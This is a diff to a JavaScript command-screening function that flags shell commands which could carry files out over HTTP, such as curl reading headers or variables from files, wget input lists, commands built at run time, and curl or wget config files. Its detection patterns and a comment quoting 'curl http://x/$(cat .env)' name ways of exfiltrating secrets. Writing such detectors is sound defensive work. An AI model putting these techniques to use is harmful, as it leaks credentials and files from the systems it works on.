@@ -193,6 +193,10 @@ function httpWrite(name, words) {
 	const curl = name.startsWith('curl');
 	// curl's -K / --config reads its options, a body included, from a file (the 1.25.0 sweep).
 	if (curl && words.some((w) => /^(-[A-Za-z0-9]*K|--config(=|$))/.test(w))) return 'an HTTP request with options from a file';
+	// Options that read a file into the request (a header, a query or a variable from @file), and wget's list of
+	// addresses from a file.
+	if (curl && words.some((w, k) => /^--(url-query|variable|expand-[\w-]+)(=|$)/.test(w) || (/^(-[A-Za-z0-9]*H|--header)$/.test(w) && /^@/.test(words[k + 1] ?? '')) || /^(-H|--header=)@/.test(w))) return 'an HTTP request that reads a file';
+	if (/^wget/.test(name) && words.some((w) => /^(-[A-Za-z0-9]*i|--input-file(=|$))/.test(w))) return 'an HTTP request that reads a file';
 	for (let i = 0; i < words.length; i++) {
 		const w = words[i];
 		const lower = w.toLowerCase();
@@ -262,8 +266,12 @@ function findOutward(text, depth) {
 	// A backtick span is a command bash runs first, wherever it sits; the tokenizer splits it into words.
 	if (depth < MAX_DEPTH) for (const m of text.matchAll(/`([^`]+)`/g)) { const hit = findOutward(m[1], depth + 1); if (hit) return hit; }
 	// A GET still sends what its address holds: an HTTP client in a command that builds text at run time ($( ), a
-	// backtick, <( )) may carry a file out in the address, so it asks (the 1.25.0 sweep: curl http://x/$(cat .env)).
-	if (/(^|[^\w.-])(curl|wget|iwr|irm|invoke-webrequest|invoke-restmethod)(\.exe)?($|[^\w.-])/i.test(text) && /\$\(|`|<\(/.test(text)) return 'an HTTP request built at run time';
+	// backtick, <( ), any variable, read or xargs) may carry a file out in the address, so it asks (the 1.25.0 sweep:
+	// curl http://x/$(cat .env)). The config files the clients read by themselves (.curlrc, CURL_HOME, .wgetrc) can
+	// add a body to a plain GET, so naming one asks too.
+	const client = /(^|[^\w.-])(curl|wget|iwr|irm|invoke-webrequest|invoke-restmethod)(\.exe)?($|[^\w.-])/i.test(text);
+	if (client && (/\$|`|<\(|\bxargs\b|\bread\b/.test(text))) return 'an HTTP request built at run time';
+	if (/[._]curlrc|CURL_HOME|[._]wgetrc|WGETRC/i.test(text)) return 'an HTTP client\'s config';
 	for (const all of tokenize(joinContinuations(text))) {
 		const segment = all.filter((word) => !word.redirect);
 		const words = segment.map((word) => word.value.toLowerCase());
